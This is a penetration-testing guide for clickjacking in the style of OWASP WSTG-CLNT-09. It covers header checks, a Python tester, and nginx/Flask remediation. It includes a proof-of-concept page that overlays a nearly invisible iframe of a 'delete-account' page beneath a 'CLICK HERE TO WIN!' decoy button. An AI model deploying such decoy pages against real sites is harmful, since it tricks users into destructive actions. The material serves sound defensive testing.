# WSTG-CLNT-09: Testing for Clickjacking

## Test ID
WSTG-CLNT-09

## Test Name
Testing for Clickjacking

## High-Level Description

Clickjacking (UI redressing) tricks users into clicking hidden elements by overlaying transparent frames over legitimate UI. Attackers can make users unknowingly perform actions like changing settings, making purchases, or granting permissions.

---

## What to Check

- [ ] X-Frame-Options header
- [ ] Content-Security-Policy frame-ancestors
- [ ] JavaScript frame-busting code
- [ ] Sensitive actions without confirmation
- [ ] iframe embedding allowed

---

## How to Test

### Step 1: Check Headers

```bash
#!/bin/bash
TARGET="https://target.com"

# Check framing protection headers
curl -sI "$TARGET" | grep -iE "x-frame-options|content-security-policy"

# X-Frame-Options values:
# DENY - Cannot be framed
# SAMEORIGIN - Only same origin can frame
# ALLOW-FROM uri - Specific origin (deprecated)

# CSP frame-ancestors:
# frame-ancestors 'self' - Only same origin
# frame-ancestors 'none' - Cannot be framed
```

### Step 2: Clickjacking PoC

```html
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC</title>
    <style>
        #target {
            position: absolute;
            width: 500px;
            height: 400px;
            opacity: 0.1;  /* Nearly invisible */
            z-index: 2;
        }
        #decoy {
            position: absolute;
            width: 500px;
            height: 400px;
            z-index: 1;
        }
        #decoy button {
            position: absolute;
            top: 200px;
            left: 150px;
            padding: 20px 40px;
            font-size: 20px;
        }
    </style>
</head>
<body>
    <h1>Click to win a prize!</h1>

    <!-- Decoy content -->
    <div id="decoy">
        <button>CLICK HERE TO WIN!</button>
    </div>

    <!-- Hidden iframe with target action -->
    <iframe id="target" src="https://target.com/settings/delete-account"></iframe>
</body>
</html>
```

### Step 3: Clickjacking Tester

```python
#!/usr/bin/env python3
import requests

class ClickjackingTester:
    def __init__(self, url):
        self.url = url
        self.findings = []

    def test_framing_protection(self):
        """Test for clickjacking protection"""
        print(f"[*] Testing clickjacking protection: {self.url}")

        response = requests.get(self.url)

        # Check X-Frame-Options
        xfo = response.headers.get('X-Frame-Options', '').upper()
        csp = response.headers.get('Content-Security-Policy', '')

        # Parse frame-ancestors from CSP
        frame_ancestors = ''
        if 'frame-ancestors' in csp:
            import re
            match = re.search(r"frame-ancestors\s+([^;]+)", csp)
            if match:
                frame_ancestors = match.group(1)

        print(f"  X-Frame-Options: {xfo or 'Not set'}")
        print(f"  CSP frame-ancestors: {frame_ancestors or 'Not set'}")

        if not xfo and not frame_ancestors:
            print("[VULN] No framing protection!")
            self.findings.append({
                "issue": "No clickjacking protection",
                "severity": "Medium"
            })
        elif xfo == 'ALLOW-FROM':
            print("[WARN] ALLOW-FROM is deprecated")

        # Check for JavaScript frame-busting
        if 'top.location' in response.text or 'self !== top' in response.text:
            print("[INFO] JavaScript frame-busting present (can be bypassed)")

    def generate_poc(self):
        """Generate clickjacking PoC"""
        poc = f'''<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC</title>
    <style>
        iframe {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.3;
        }}
    </style>
</head>
<body>
    <h1>Clickjacking Test</h1>
    <iframe src="{self.url}"></iframe>
</body>
</html>'''
        return poc

# Usage
tester = ClickjackingTester("https://target.com/settings")
tester.test_framing_protection()
print("\nPoC HTML:")
print(tester.generate_poc())
```

---

## Remediation

```python
# Add X-Frame-Options header
@app.after_request
def add_security_headers(response):
    response.headers['X-Frame-Options'] = 'DENY'
    # Or use CSP (more flexible)
    response.headers['Content-Security-Policy'] = "frame-ancestors 'self'"
    return response
```

```nginx
# Nginx configuration
add_header X-Frame-Options "DENY" always;
add_header Content-Security-Policy "frame-ancestors 'self'" always;
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| No framing protection on sensitive page | 4.3 | Medium |
| ALLOW-FROM (deprecated) | 3.5 | Low |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-1021** | Improper Restriction of Rendered UI Layers |

---

## Checklist

```
[ ] X-Frame-Options checked
[ ] CSP frame-ancestors checked
[ ] JavaScript frame-busting analyzed
[ ] PoC created
[ ] Sensitive pages tested
[ ] Findings documented
```
